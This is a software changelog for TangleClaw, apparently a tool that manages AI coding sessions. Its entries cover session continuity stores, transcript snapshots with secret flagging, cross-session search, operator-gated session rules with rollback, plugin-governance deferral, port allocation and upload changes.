- **Self-improvement loop + Project Rules modal (CC-6, #381).** A per-project **Project Rules** section in the Settings modal with three rule boxes — **Startup** (injected at session launch), **Wrap** (custom wrap behavior + the self-learning sink), and **Mode** (harness posture) — plus **8 wrap-summary section checkboxes** (`Next action` is mandatory: force-checked and disabled). **Reuses D1a/D1b's `session_rules` store rather than adding a parallel one** (the contract's "Project-rules store → NOT a new store"): a new **`kind` discriminator** (`startup`|`wrap`|`mode`, schema **v19→v20**) lets the three boxes coexist, and the launch-injection query (`listActiveForProject`) now filters to `kind='startup'` — existing rows backfill to `startup`, so **no injection regression**. The **wrap-section toggles** persist to `project.json` as `wrapSections` (null = the deep default, all 8); `lib/continuity.js` `renderWrapSummary` gains an `enabledSections` gate (new exported `effectiveWrapSections` helper) and the `continuity-write` wrap step reads the project's selection. The **self-critique → wrap-rules loop** reuses D1b's engine: `promoteFromLearning`/`create` and the conflict signal accept `kind`, so an AI-proposed `kind='wrap'` rule flows through the existing Critic gate and lands user-gated in the Wrap rules box (documented in `docs/session-rules-self-improvement.md`). New API: `GET/POST /api/session-rules` accept `kind`; project PATCH accepts `wrapSections`. **Deferred (documented):** per-methodology depth presets → CC-8; mode-rule runtime enforcement → A3 (#209).

- **Operator-facing cross-session search — the continuity drawer (CC-5, #344).** A search box over a project's whole session history, reachable from each project card (&#128269; History button → a dedicated "Session History & Search" drawer, NOT folded into Settings). **Two-stage funnel:** (1) **warm global search** across the changelog + all wrap summaries — the default, so you never name a session first — with **five filters** (date range, `tags`, `type`, file-touched, `refs`), ranked **recency-primary / match-count-secondary** and grouped by session; (2) **cold drill-down** — click a result to deep-search that one session's raw `transcript.jsonl` (CC-4b), returning excerpts with role + timestamp. **New `lib/continuity.js` surface:** `searchSessions()` (wraps the CC-2 `search()` — left intact — then filters/ranks/groups; empty query + filters ⇒ browse mode), `listSessions()` (merges wrap frontmatter + changelog entry + transcript meta per session, surfacing transcript-only sessions too), `searchTranscript()` (streams the JSONL line-by-line, extracting assistant text/thinking/tool_use + user string-or-blocks + system content; honest stub for non-Claude harnesses; bounded excerpt cap with a `truncated` flag), and `readTranscriptMeta()`. **Two persisted-schema additions** feed the new `type` / file-touched filters: a `type:` wrap-frontmatter key + `[type]` changelog token sourced from the session **branch prefix** (`feat`/`fix`/`chore`/`docs`/`refactor`; `feature`→`feat`), and a `files:` key/line sourced by **reusing the wrap step's already-computed touched-files list** (`continuity-write.js` `_mapDelta().touched` — no new git call). Both are **forward-only**: sessions wrapped before CC-5 stay un-indexed for these two filters, and the drawer **labels that gap honestly** (`meta.unindexed`) rather than returning a silent empty. **Four read-only routes** (`server.js`): `GET /api/continuity/:project/search`, `/sessions`, `/sessions/:sid` (wrap summary + transcript meta with the absolute `~/.claude` source path stripped + the session's uploads), `/sessions/:sid/transcript/search`. Secret safety carries through: the drill-down surfaces the CC-4b `secretsFlagged` / `secretTypes` (pattern types only, never values) so the UI warns before showing transcript content. Frontend: new `public/history-drawer.js` + drawer markup + styles. **Project-wide direct transcript search (operator fold-in):** a **Summaries / Full transcripts** toggle on the search box — Full mode (`searchProjectTranscripts()` + `?scope=transcripts`) greps *every* captured transcript in the project at once (the direct "search my old transcripts" path, no summary-first funnel required), honoring the same five filters and surfacing the secret badge; cheap because it's text grep over files, never an LLM-context load. **Result UX:** the matched substring is highlighted (`<mark>`) in result lines, drill-down section bodies, and transcript excerpts; a result summary line, a selected-result highlight, a clearer "× Close session", and per-hit location tags (section / changelog / transcript role). Service worker registers `history-drawer.js` + cache-bumped so the new shell reaches active clients.
- **Transcript snapshot into the consolidated store — the continuity cold tier (CC-4b, #376).** At wrap, TC copies a session's raw transcript into `<project>/.tangleclaw/continuity/sessions/<sid>/transcript.jsonl` (CC-4's store layout) + a `transcript.meta.json` envelope sidecar, and scans it for secrets — the cold tier CC-5's drill-down will deep-search. **Wrap-time resolution, no hook (`lib/transcript.js`, new):** rather than a SessionStart hook handshake (which would touch the live hook chain — the #94/#145 hazard — and need a new endpoint + schema column), TC resolves the transcript itself at wrap. A real-surface probe confirmed Claude transcripts live at `~/.claude/projects/<cwd-with-/-and-.-as-->/<session-uuid>.jsonl` and that transcript lines carry `cwd` = the project path, so a session's transcript is identified by **content match** (newest `.jsonl` whose `cwd` matches), not fragile dir-name decoding. **Forward-compatibility seam (operator-requested):** resolution dispatches through a harness-adapter registry keyed by `session.engineId` — the `claude` adapter is implemented; `gemini` / `codex` / `aider` / `openclaw` are documented stubs returning `null` (honest "no transcript yet"), so adding a harness later = implement one `resolve()`, no core surgery. The envelope's `harness` field tells consumers which format they hold; only the Claude payload is stored (raw `.jsonl`) for now. **Secret scan:** reuses `lib/secret-scan.js` (CC-4), streaming the JSONL line-by-line (bounded memory, no whole-file cap — the transcript is the richest leak surface); the flag records **pattern types only, never the value** in `transcript.meta.json` (`secretsFlagged`/`secretTypes`). **Wiring (`lib/wrap-steps/continuity-write.js`):** folded into the existing `continuity-write` step (no `template.json` step add → no schemaRevision re-propagation) in its **own isolated try/catch** — a transcript failure (slow/huge copy, unresolved harness, absent `~/.claude`) never affects the warm-tier writes and never halts a wrap; the result is reported in the step output (`captured` + line count + secrets). **Out of scope:** cross-model transcript *parsers* (seam stubs only), remote/webui (OpenClaw) transcripts whose `~/.claude` is on another host (honest local skip), and the persistent history-list secret badge (→ CC-5). **No hook, no endpoint, no schema migration** (supersedes #376's original hook-handshake framing). **Tests:** new `test/transcript.test.js` (adapter resolve incl. newest-wins + cwd-mismatch + fallback-scan + non-Claude null; snapshot copy + meta sidecar; secret flag with value-never-stored invariant; honest `captured:false`) + `test/wrap-step-continuity-write.test.js` (snapshot wired + reported; a snapshot throw is swallowed, warm tier still written, wrap not halted). Closes #376. Spec: `.prawduct/artifacts/cc-4b-transcript-snapshot.md`.
- **Consolidated per-project continuity store — session-linked uploads + secret badge (CC-4, #343).** Establishes the per-session sub-tree `<project>/.tangleclaw/continuity/sessions/<sid>/` as the single home for a session's cold-tier data, and relocates uploads into it. **Store layout (`lib/continuity.js`):** new `sessionDir(projectPath, sid)` / `sessionUploadsDir(projectPath, sid)` helpers, keyed by the same integer `sid` already used as the `session:<sid>` pointer (so retrieval stays uniform and the repo-rename chunk re-keys one root, not four). **Uploads (`lib/uploads.js` + `server.js`):** `saveUpload` gains an optional `sid` arg and writes under the session's uploads dir; the `POST /api/upload` route resolves the active session via `store.sessions.getActive`. No active session → falls back to the legacy flat `<project>/.uploads/`. `listUploads` reads **both** the legacy dir (reported `session: null`) and every per-session dir, merged newest-first — pre-CC-4 uploads keep appearing (back-compat by construction). **Secret badge (`lib/secret-scan.js`, new):** flag-only detection (`scanText` → high-confidence patterns: AWS/Slack/GitHub/Google keys, PEM private keys, generic long-value secret assignments) runs on text uploads within a 1 MB cap; a hit is recorded in a per-dir `_scan.json` sidecar (manifest stores **pattern types only, never the secret value**) and surfaced as an amber `.badge-secret` in the upload history (`public/session.js`). **The file is never scrubbed, masked, or blocked** — the operator remediates manually (Continuity Contract §Secrets). **Cascade-delete (`lib/projects.js`):** the store lives under `project.path`, so `deleteProject({deleteFiles:true})` wipes the whole store by construction; `deleteFiles:false` deliberately preserves it. **Deferred → CC-4b:** the model-agnostic transcript snapshot (needs a Claude `transcript_path`/`session_id` hook handshake + a session-row schema migration TC doesn't have yet) lands in a follow-up and slots into the same `sessions/<sid>/` layout, reusing this chunk's `secret-scan` + badge plumbing. **Tests:** `test/secret-scan.test.js` (new — each pattern, clean-prose negative, value-never-leaked invariant), plus continuity path-helper, uploads (sid routing, legacy+session merge, flag manifest, binary-skip, sort) and projects (delete cascade both ways) coverage. Spec: `.prawduct/artifacts/cc-4-consolidated-store.md`.
- **Continuity Map — self-maintained feature/component index in the hot continuity index (CC-3).** Generalizes the `features-toc` pattern into the continuity index's `## Map` section: at wrap it **stubs** a `- **TBD** — \`<path>\` <!-- describe -->` entry for each touched source file not already referenced, and **prunes** entries whose every referenced path was deleted (a multi-file curated feature entry survives if any of its files remain; pure-prose entries are never pruned). The AI fills/groups descriptions in-session, same division of labor as `features-toc`. **Schema (`lib/continuity.js`):** `renderIndex`/`parseIndex` gain a `## Map` section (rendered between `Next action` and `Freshness`); the Map is the **one index section preserved verbatim across wraps** — it is curated/accreted, while `Current state`/`Next action` are regenerated each wrap. `updateMap(existingMapText, { touched, deleted })` is the pure stub+prune merge; `readIndexRaw` recovers the full parsed index (incl. Map) even for a degraded no-judgment index that `readIndex` would null out. **Wiring (`lib/wrap-steps/continuity-write.js`):** before the index rewrite, reads the prior Map, computes touched/deleted vs the base branch via `git diff --name-status <base>...HEAD` (A/M→touched, D→deleted, R→old deleted + new touched) filtered through `features-toc._isIndexableCandidate` (reused allowlist), runs `updateMap`, and writes the merged Map back. Still `blocker:false`; any Map-maintenance failure (no base, git error) leaves the prior Map intact and never halts a wrap. **Scope:** the continuity Map is the **internal hot-tier** map and is a **baseline** (no `featureIndexEnabled` toggle) — it coexists with the public-facing `FEATURES.md`, which is unchanged. The index's `Active threads`/`Canonical artifacts` sections are deferred (not part of CC-3). **Tests:** +17 across `test/continuity.test.js` (Map render/parse round-trip + empty placeholder; `updateMap` stub/idempotent/prune-all-deleted/keep-multi-file/never-prune-prose/combined/no-op; `readIndexRaw` degraded + absent) and `test/wrap-step-continuity-write.test.js` (stub-touched, prune-deleted-preserve-curated across rewrite, no-base no-op, allowlist filtering, `_mapDelta` A/M/D/R classification). Spec: `.prawduct/artifacts/cc-3-continuity-map.md`.
- **Continuity warm tier — per-session append-only changelog + 8-section wrap summary + grep retrieval (CC-2).** Builds the warm tier of the Continuity Contract on top of CC-1's gitignored per-project store (`.tangleclaw/continuity/`). **Schemas (extend `lib/continuity.js`, pure render/parse like CC-1):** `renderChangelogEntry`/`appendChangelogEntry` write a per-session, **append-only** `changelog.md` entry (`- <date> (session:<sid>) <line>` + optional `tags:`/`refs:`, omitted when empty — honest absence, never fabricated); `renderWrapSummary`/`parseWrapSummary` (+`writeWrapSummary`/`readWrapSummary`) produce one `wraps/<sid>.md` per session with YAML frontmatter (session, date, project, methodology, harness, branch, sha, tags — emitted only when present) and the **8 fixed `## sections`** (`Where we are`, `Next action`, `Delta`, `Open threads`, `Decisions`, `Landmines`, `Pointers`, `Freshness`), honest-flagging any uncaptured section `_⚠ not captured_` (reuses CC-1's `_unflag`). **Grep retrieval:** `search(projectPath, query, {section})` scans the changelog + every wrap summary (case-insensitive, optional section scope) and returns structured matches carrying the `session:<sid>` pointer — so a "this broke again" query resolves to the session whose summary explains the fix. Pure JS scan (model-agnostic, zero-infra); SQLite FTS stays the reserved scale option, `rg` is only a shell alias here. **Wiring:** `continuity-write` now also appends the changelog entry + writes the wrap summary from `session.id` (sid), `project.methodology`, `session.engineId` (harness), git facts, and the captured `summary`/`nextSteps`/`learnings` (→ Where we are / Next action / Landmines); still `blocker:false`, partial-failure flags reported per-tier, never halts a wrap. **Decisions:** session pointer = integer `session.id` (the contract's `s_DATE_TIME` was aspirational; `date:` gives chronology); the 4 uncaptured sections are honest-flagged — extending the wrap prompt to emit all 8 overlaps CC-8 and is deferred (backlog). **Tests:** changelog format/append-only/omit-empty, wrap-summary 8-section render + round-trip + honest-empty, `search` (changelog + section-scoped wrap-summary hits, pointer surfaced, case-insensitive, absent-store/no-match → empty), and wrap-step warm-tier write + session-absent skip + non-blocking partial failure. Spec: `.prawduct/artifacts/cc-2-continuity-schemas.md`.
- **PortHub auto-allocates a non-colliding `local_port` (and opt-in `bridge_port`) when adding an OpenClaw connection (#352).** Previously every OpenClaw connection defaulted its tunnel `local_port` to `18789`; adding a second instance without hand-picking a port collided on bind, detected only at tunnel time, never prevented at add-time. New `porthub.nextFreePort({ range, host })` returns the first port in a half-open `[start, end)` range that is neither held by a live lease (`store.portLeases.checkConflict`) nor OS-bound (`portScanner.isPortInUseBySystem`, localhost only); throws on a malformed range or an exhausted range. The `POST /api/openclaw/connections` route now **auto-allocates `local_port` from `[18789, 18999)` when omitted** (an explicit port is still conflict-checked and used verbatim) and **leases the resolved port at create-time** under the connection's `oc-direct-<id>` identity, closing the allocate→bind race so a second add reserves a different port even before the first tunnel comes up. `DELETE` now releases the `bridge_port` lease in addition to `local_port`. **`bridge_port` stays NULL-by-default** (load-bearing for #160 — a non-null bridge port emits an extra `-L` SSH forward that breaks non-ClawBridge tunnels); it auto-allocates from `[3201, 3300)` **only** when the caller opts in with the sentinel `bridgePort: "auto"`, and an explicit number is conflict-checked for parity with `local_port`. **UI:** the connection form's Local Port field is now blank-with-`auto` placeholder for new connections (blank → omitted → server auto-allocates; a typed value is sent verbatim; on edit a blank leaves the stored port unchanged). **Tests:** `nextFreePort` unit coverage (lease-skip, OS-bound-skip, host-scoping, exhaustion, malformed-range) in `test/porthub.test.js`; route-level collision-avoidance on consecutive adds, explicit-port-respected, lease-at-create, `bridgePort:"auto"` allocate-and-release, and explicit-bridge-conflict rejection in `test/api-openclaw.test.js`. This is the surviving PortHub kernel of the descoped #332. Spec: `.prawduct/artifacts/chunk-352-porthub-nextfree.md`.
- **Session-rules self-improvement loop — versioning + rollback, learnings→rule promotion, conflict-surfacing + Critic gate (#347, D1b).** Completes the ratified D1 on top of D1a. **Versioning + rollback (schema v18→v19).** New `session_rule_versions` table snapshots a rule's full state after **every** mutation (`create`/`update`/`delete`/`restore`; `version_no` monotonic per rule; `rule_id` is a logical reference with no FK cascade so history **survives a delete** for audit). `store.sessionRules` gains `listVersions(ruleId)` and `restore(ruleId, versionNo)` (rolls content+enabled back and records an `op='restore'` snapshot) — required because autonomous self-editing without rollback is unsafe. `create`/`update`/`delete` now take optional `changedBy`/`changeReason` so the audit trail distinguishes operator vs. AI authorship. **Learnings→rule promotion.** `store.sessionRules.promoteFromLearning(learningId, overrides)` creates an `created_by:'ai'` rule with provenance recorded in a new nullable `source_learning_id` column (FK to `learnings`, `ON DELETE SET NULL`); **operator-confirmed** — never auto-runs. **Conflict-candidate signal.** `findConflictCandidates(content, projectId)` returns active in-scope rules sharing ≥2 significant tokens with a proposed edit — explicitly a **non-authoritative** hint of what to compare, NOT semantic auto-resolution (the ratified design forbids auto-resolving conflicts). **API.** `POST /api/session-rules/promote`, `POST /api/session-rules/conflicts`, `GET /api/session-rules/:id/versions`, `POST /api/session-rules/:id/restore`. **UI.** Per-rule **History** disclosure (version list + Restore buttons) and an **AI** badge on `created_by:'ai'` rules in the Session Rules panel. **Critic gate (in-session agent capability, not server code).** Per the ratified constraint that TC's server cannot summon a Critic, the gate for conflicting/autonomous edits is an in-session procedure — documented in the git-tracked `docs/session-rules-self-improvement.md` (with a per-clone paste-able copy at `.claude/priming/d1b-rule-review.md`): stage the proposed edit as a **git-tracked** scratch file [`.prawduct/` is gitignored → invisible to the Critic], snapshot/restore `.critic-findings.json` around the pass to avoid clobbering a build chunk's record, invoke `/prawduct:critic chunk`, capture findings, surface to the operator with findings attached; non-Claude harness falls back to discussion + operator decision. This procedure was **proven empirically** during D1b planning. **Tests.** New `test/session-rules-selfimprove.test.js` (versioning snapshot/tombstone, restore incl. disabled-state + NOT_FOUND, promotion + provenance, conflict-candidate overlap/exclusion/minOverlap), `test/api-session-rules-selfimprove.test.js` (promote/conflicts/versions/restore routes + 400/404), extended `test/session-rules-panel.test.js` (history/restore/AI-badge UI), schema-version assertions bumped to v19 across `test/store*.test.js` / `test/sessions-webui.test.js`. The `Chunk D1` build-plan box flips with this chunk (D1 = D1a + D1b). Plan: `.claude/plans/d1b-self-improvement.md`.
- **Session rules — durable operator-authored behavioral directives, injected cross-model at launch (#347, D1a).** A new `session_rules` store (schema **v18**) holds active directives that an operator authors once and that ride the same cross-model injection path as global-rules — distinct from `learnings` (AI-accumulated observations) and from the structured core/extension toggles. **Store.** New `session_rules` table (`id`, nullable `project_id` [NULL = global, applies to every project], `content`, `enabled`, `created_by` [`operator` default / `ai` for the future D1b path], nullable `owner` auth-seam, timestamps) with a v17→v18 migration; a `store.sessionRules` API (`listActiveForProject` — the injection query returning global + a project's own active rules; `list` with `{enabled, projectId, scope:'global'}` filters; `get`/`create`/`update`/`delete` with `session_rule.*` activity logging). **Cross-model injection.** `engines._getRulesContent` now loads `sessionRulesLines` (guarded, fails soft) and all four generators render a **`## Session Rules`** section adjacent to the global-rules block — markdown bullets for `CLAUDE.md`/`GEMINI.md`, instruction lines for `.codex.yaml`, `#`-comment lines for `.aider.conf.yml` — rendering **nothing when empty**. Picked up on a project's next session launch / sync, identical to how global-rules edits propagate (no new regen trigger). **API.** `GET` (optional `?scope=global` / `?projectId=`), `POST`, `PUT /:id`, `DELETE /:id` under `/api/session-rules`, with the 256 KB body cap + non-empty-content validation. **UI.** A new dash-bar **Session Rules** panel (list with per-rule enable toggle + delete, plus an add form) managing **global** rules; per-project authoring UI is deferred to the CC-6 Project Rules modal (the schema already supports it). **Scope:** D1a is store + injection + CRUD + a basic global-rules UI; AI autonomous editing, version/rollback, and learnings→rule promotion are D1b. **Tests.** New `test/session-rules.test.js` (store CRUD, injection query incl. disabled/other-project exclusion, `created_by` default, cascade delete, activity logging), a `session rules injection (#347/D1a)` block in `test/engines.test.js` (all 4 generators render / render-nothing-when-empty / global+per-project), `test/api-session-rules.test.js` (route lifecycle + 400/404), `test/session-rules-panel.test.js` (frontend structural assertions); schema-version assertions across `test/store*.test.js` / `test/sessions-webui.test.js` bumped to v18. Plan: `.claude/plans/d1a-session-rules.md`.
- **Retire the V1 platform template + visible governance-drift indicator (#353, C2).** Two coupled cleanups that make governance honest and visible. **(1) Template strip.** The bundled `data/templates/prawduct/template.json` no longer ships the V1 L3/L4 governance it had been distributing to all non-TC projects: the `hooks.claude` block (the `product-hook` `SessionStart`/`Stop` governance hooks, already inert since #336 deleted the binary — the `requires:["tools/product-hook"]` gate fails closed) is now empty, and the L3 `critic-check` wrap step is removed (`schemaRevision` bumped `2 → 3` so the framework-subtree reconcile propagates the step change to existing installs). The cross-model native base stays — L0 rules, L1 prime (emitted separately by `engines.js`, never in the template), the L2 wrap pipeline (now 9 steps), `evalDimensions`, `actions`. Effect: a **newly-created project can no longer inherit V1 governance** — it gets L0–L2 only, and opted-in Claude projects receive L3/L4 from the V2 plugin (per-project migration shipped in C1, #262). **(2) Drift indicator.** A new derived `governanceState` (`engines.governanceState(projectPath, {engineId, methodology})` → `governed-plugin | governed-vendored | drift-no-governance | not-applicable`) classifies each project; it reuses `isPluginGoverned` plus the same `tools/product-hook` existence predicate the `requires` gate applies, takes engine/methodology from the canonical DB row (not the stale-prone `project.json`, cf. #320), and **fails closed** (malformed settings → `drift-no-governance`, never a throw). It's surfaced on the enriched project object (so it rides `GET /api/projects` and `GET /api/projects/:name` with no server change) and rendered as a per-project **`⚠ governance drift`** badge (`public/ui.js` / `.badge-drift`, amber) — shown **only** for the alarming `drift-no-governance` state (a Cohort-B project labeled prawduct + Claude but on neither the plugin nor a vendored hook, so its Stop-gate/Critic layer is silently off, #353). The badge **self-clears** on the next list fetch once a project migrates (the state recomputes live). No session advisory is raised — the advisory system is the plugin's private state, and writing into it from the TC runtime would cross the #336 governance boundary. **Tests.** New `governanceState (#353)` block in `test/engines.test.js` (plugin / vendored / drift / plugin-beats-vendored / non-Claude / non-prawduct / missing-meta / malformed-fail-closed); an `enrichProject — governanceState` block in `test/projects.test.js` (drift / governed-plugin / not-applicable / field-present-on-every-list-entry); a migration self-clear assertion in `test/c1-plugin-migration.test.js` (drift → governed-plugin); new `test/governance-drift-badge.test.js` (badge gating + CSS). Strip-contract updates: `test/wrap-pipeline.test.js` / `test/store.test.js` / `test/sessions.test.js` / `test/skills.test.js` step-list pins moved to the post-C2 (no `critic-check`) 9-step shape and pin the bundled template ships no governance hooks; `test/projects.test.js`'s methodology-flip suite now exercises a synthetic hooked methodology (since no shipped methodology declares hooks post-strip). Plan: `.claude/plans/c2-retire-v1-template.md`.
- **Per-project migration to the Prawduct V2 plugin — hybrid onboarder action (#262, C1).** A cohort-aware, session-safe operation that migrates a TC-managed Claude project from vendored/drift governance to the V2 plugin — the operational payoff that makes chunk B's (#330) deferral reachable per project. New `engines.migrateToPlugin(projectPath, methodologyTemplate)` writes the plugin install reference into the project's `.claude/settings.json` (`enabledPlugins["prawduct@prawduct"]` + the `extraKnownMarketplaces` entry) — **sourced from TangleClaw's OWN settings.json** so a migration always uses TC's current pin (survives a version bump; no hardcoded `v2.1.5`) — then re-syncs engine hooks. Because `isPluginGoverned` now returns true, `syncEngineHooks` suppresses the methodology governance hook (**neutralizing the vendored `product-hook` reference by dropping it from settings.json — no destructive delete of the project's file**) while keeping TC's L1 prime. The write is **non-destructive** (every other settings key preserved) and **idempotent** (an already-governed project is a no-op); a malformed `settings.json` is **refused, never clobbered**. The orchestrator `projects.migrateProjectToPlugin(name)` (exposed at **`POST /api/projects/:name/migrate-to-plugin`**) adds the policy gates: **Cohort C** (non-Claude engines) → `migrationStatus = 'not-applicable'`, no mutation (the Claude-only plugin can't serve them); **session-safety** — if the project has a live session (via the #347 ownership primitive) the migration **defers with no mutation** (never auto-closes a session; explicit operator action only); and **activation honesty** — on success the status is `'migrated'` only when the plugin is installed at machine scope (`installed_plugins.json`), otherwise `'pending-activation'` (the reference is written but a fresh machine still needs `/plugin install`) — never a silent governance gap. A new persisted **`migrationStatus`** column on projects (schema **v17**; `NULL | migrated | pending-activation | declined | not-applicable`) tracks per-project state for operator follow-up and the upcoming C2 drift indicator (#353), and is surfaced on the enriched project object (GET responses). Stripping the V1 `product-hook` hooks from the platform template (so *new* projects get L0–L2 only) and the visible-drift indicator are deliberately scoped to **C2**. **Tests.** New `test/c1-plugin-migration.test.js` (19): `migration_status` store round-trip; `_readSelfPluginRef` (reads TC's ref / null when TC ungoverned); `pluginInstalledAtMachineScope` (true with marker / fails closed); `migrateToPlugin` (writes ref, non-destructive key preservation, idempotent no-op, malformed-refusal, no-self-ref error, vendored-hook neutralization); orchestrator (Cohort-C not-applicable, live-session defer, happy-path migrated, pending-activation when uninstalled, idempotent already-governed, unknown-project error, enriched-object surfacing); schema-version assertions across `test/store*.test.js` / `test/sessions-webui.test.js` updated for v17. Decisions: `.prawduct/artifacts/c1-hybrid-onboarder.md`.
- **Per-session scope guard — flag wrong-tab requests before acting (#340).** The first **consumer** of the session-ownership primitive (#347): every session's prime now carries a `## Scope Guard` directive built on top of Slice 3's identity-only `## Session Ownership` block. It tells the agent to **flag a request that clearly belongs to a different project before acting** — editing or committing in another repo's territory — leading with a one-line heads-up, naming the likely tab when it can, and **waiting for the operator's confirmation**. The posture is **surface, never refuse**: the operator can always say "do it here." This generalizes the existing cross-session write-boundary rule from "don't write to another session's repo" into "detect and flag a likely wrong-tab request up front," and it mechanizes the operator's standing `feedback_flag_wrong_session_work` preference (a stack of portfolio work was once built from the wrong inference session before it was caught — the cost of a miss is wrong-repo commits; the cost of the guard is one confirmation line). New `sessionOwnership.scopeGuardSection(project)` (`lib/session-ownership.js`) renders the block and is injected in `generatePrimePrompt` (`lib/sessions.js`) immediately after the identity block; keeping it a **separate** function preserves Slice 3's identity-only contract (a test still asserts no flagging directive leaks into `primeSection`). The "other tabs" list is drawn from `listLive()` minus the owned project, **filtered to confirmed-live sessions only** (`o.live` — a real `tmux.hasSession` pane probe for local sessions; db-only for remote until #347 Slice 2b lands), so a stale `active`/`wrapping` DB row whose pane is gone is dropped rather than named as a phantom tab. The current session's row doesn't exist at prime-gen time so `listLive` already excludes self; the owned project is also dropped by name to handle a prior same-project session still wrapping. The list is a launch-time snapshot (a tab opened mid-session won't appear) and intentionally uncapped (capping could hide the very tab a request belongs to); the core flag-before-acting directive renders regardless of the list. Always-on (no per-project toggle — a gentle, universally-safe directive); rides the same silent-prime path as Slice 3 (Claude-first by design). **Tests.** New "Chunk #340 — scope guard prime" block in `test/session-ownership.test.js` (7): renders the block naming the owned project, surface-never-refuse wording (flag / wait / "do it here"), lists other live siblings (active + wrapping) excluding self, never lists the owned project (belt-and-suspenders mid-wrap case), **drops a stale sibling whose tmux pane is gone**, core directive with no stale list when none are live, and empty-for-nameless-project. Decisions captured in `.prawduct/artifacts/session-ownership-primitive.md`.
- **Continuity Contract — visible "we left off at X, continue?" resume (CC-1, #342).** The thin first slice of the 4.0 Continuity Contract (`.claude/plans/continuity-contract.md`): a WRITE→READ loop that fixes the stale-handoff + invisible-banner pains the contract was written to kill. **WRITE** — a new `continuity-write` wrap step (`lib/wrap-steps/continuity-write.js`, runs after `commit` in the prawduct pipeline so its stamp anchors to the wrap commit) rewrites a curated **hot index** (`lib/continuity.js` → `<project>/.tangleclaw/continuity/index.md`, gitignored) carrying `## Current state`, a keystone `## Next action`, and a `## Freshness` stamp (short sha · branch · ISO date). It feeds off the AI's existing `memory-update` capture (`summary`/`nextSteps`) plus server-side git facts; with no capture it writes a **flagged-empty** Next action rather than fabricating one (honest-emptiness mechanical floor), and it **never blocks a wrap**. **READ** — `generatePrimePrompt` (`lib/sessions.js`) upgrades from a *passive* "Last Session Summary" blob to an *actionable* `## Resume` directive: because the prime is hidden model context (the operator never sees it), it instructs the AI to turn "hidden in" into "visible out" — run a **freshness check first** (issue still open? branch merged? artifact present? HEAD vs the written-at sha), then emit one **visible** first-turn message leading with the `*TangleClaw'd into existence.*` banner and "We left off at X. Next: Y." — honestly flagging staleness — and **wait for the operator's go** (no auto-execute, preserving the no-auto-lifecycle rule). Falls back to the legacy passive summary when no index exists yet. **Tests.** New `test/continuity.test.js` (render/parse round-trip, flagged-empty + degraded-index handling, non-throwing reads) and `test/wrap-step-continuity-write.test.js` (capture→index, most-recent-capture wins, mechanical-floor degrade, git-unavailable, write-failure never halts); `test/sessions.test.js` gains a Resume-directive block (actionable upgrade, passive fallback, degraded-index skip). Step-list contract pins in `test/skills.test.js` / `test/wrap-pipeline.test.js` updated for the appended step (prawduct now ships 10 wrap steps).
- **Upload modal: any file type + copyable Recent-uploads links (#338).** The per-project file uploader no longer restricts to an image/doc allowlist — **any file type uploads** now. The backend `lib/uploads.js` dropped the hardcoded `ALLOWED_EXTENSIONS` gate (and `POST /api/upload`'s dead "not allowed" → 400 branch); uploads are stored under `.uploads/` and only ever referenced by local path (never served over HTTP or executed), so type carries no execution/XSS vector — the safety boundary is the **retained filename sanitization** (strips path separators → no traversal; the extension is sanitized to alphanumerics; an empty base name falls back to `file`). The frontend `accept` allowlist on the file input is removed. Separately, the **Recent uploads history is now actionable**: each item is a keyboard-accessible button that **click-to-copies its local path** to the clipboard (with a toast), mirroring the post-upload *"Tell your AI assistant: <path>"* affordance — so a previously-uploaded file's link can be re-grabbed without re-uploading (`/api/uploads` already returns each `path`). The 15 MB request-body cap is unchanged (size is a separate concern). **Tests.** `test/uploads.test.js` + `test/api-uploads.test.js` invert the type-rejection cases (`.exe`/`.zip`/`.mp4`/no-extension now accepted) and add ext-sanitization + empty-base-name-fallback coverage; new `test/upload-modal-frontend.test.js` locks the removed `accept` allowlist and the history click/keyboard copy wiring.
- **TangleClaw defers governance config to the Prawduct V2 plugin when it owns a project (#330).** Foundation for the 4.0 methodology/harness/model re-arch: TC's two destructive config writers now *step aside* for any project governed by the [`brookstalley/prawduct`](https://github.com/brookstalley/prawduct) V2 Claude Code plugin, instead of clobbering the plugin's files on every session launch / boot-sync / engine-or-methodology PATCH. A new `engines.isPluginGoverned(projectPath)` detects the plugin install reference — a truthy `enabledPlugins["prawduct@<marketplace>"]` in the project's `.claude/settings.json` — and gates both writers: (1) `writeEngineConfig` returns a clean `skipped` result (no error) and **does not regenerate `CLAUDE.md`**, leaving the plugin's thin `PRAWDUCT:ANCHOR` file intact; (2) `syncEngineHooks` **suppresses the governance (methodology) hooks but keeps TC's L1 baseline prime hook** — the V2 plugin owns L3/L4 governance (its own Stop gate) while TC's session-prime stays native (the hybrid: L0–L2 are TC-owned cross-model). The regenerated block overwrites any stale vendored governance hook (so it can't fire alongside the plugin or break once the vendored script is gone) while **preserving every non-hook key** (`enabledPlugins`, `extraKnownMarketplaces`, …) so the install reference survives. Detection is the *stable* anchor by design — `syncEngineHooks` only ever mutates `.hooks`, so the reference persists through TC's own regeneration even though `CLAUDE.md` does not. The check **fails closed** (returns `false` on a missing/unreadable/malformed `settings.json`), so a parse error can never silently suppress normal config generation. This auto-detecting deferral collapses the planned manual self-governance opt-out and the platform-delegation step into one self-maintaining mechanism: onboard a project to the plugin → TC backs off automatically; un-onboard → TC resumes. No behavior change for any project without a plugin reference. **Tests.** New "Prawduct V2 plugin-governed deferral (#330)" block in `test/engines.test.js` (10): `isPluginGoverned` true/disabled/absent/unrelated/malformed-JSON cases, `writeEngineConfig` defers-without-clobber + still-writes-when-ungoverned regression, `syncEngineHooks` on a governed project: silentPrime-off drops the governance hook entirely, **silentPrime-on keeps the L1 prime SessionStart but drops the governance Stop** (no surviving hook references the vendored script), install reference preserved; plus a boot-sync (`syncAllProjects`) governed case (anchor preserved + governance hook stripped at boot).

### Internal

